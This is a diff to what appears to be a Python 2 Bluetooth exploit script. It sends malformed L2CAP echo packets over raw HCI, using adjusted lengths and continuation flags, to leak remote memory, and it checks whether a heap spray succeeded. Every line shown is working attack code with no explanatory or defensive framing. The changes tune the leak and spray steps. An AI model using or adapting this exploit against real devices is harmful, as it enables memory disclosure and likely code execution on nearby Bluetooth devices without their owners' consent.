@@ -21,7 +21,7 @@ def recv_l2cap():
     global pkt
     global echo
     while True:
-        pkt = l2cap.recv(10240)
+        pkt = l2cap.recv(1024)
         if ord(pkt[0]) == 0x9: #ECHO RESP
             print "ECHO", hexlify(pkt)
             echo = pkt
@@ -65,7 +65,6 @@ while True:
     except socket.error:
         print "Retry"
         import traceback; traceback.print_exc()
-        l2cap.close()
         time.sleep(1)
 
 start_new_thread(recv_l2cap, ())
@@ -86,12 +85,13 @@ def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0):
 
     hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)
 
-def do_leak(ident=42):
+def do_leak(ident=1):
     global echo
     echo = False
+    send_echo_hci(0, "A"*(32))
     send_echo_hci(ident, "A"*70, l2cap_len_adj=2)
     send_echo_hci(ident+1, "B"*70, continuation_flags=1)
-    while not echo:
+    while echo == False:
         pass
 
     return echo
@@ -136,6 +136,8 @@ while True:
     if leak[8:8+verify_len] == cmd[0x16:0x16+verify_len]:
         print "Heap spray succsessfull"
         break
+    else:
+    	print "Heap spray failed"
 
     ident = (ident + 2)%250
 
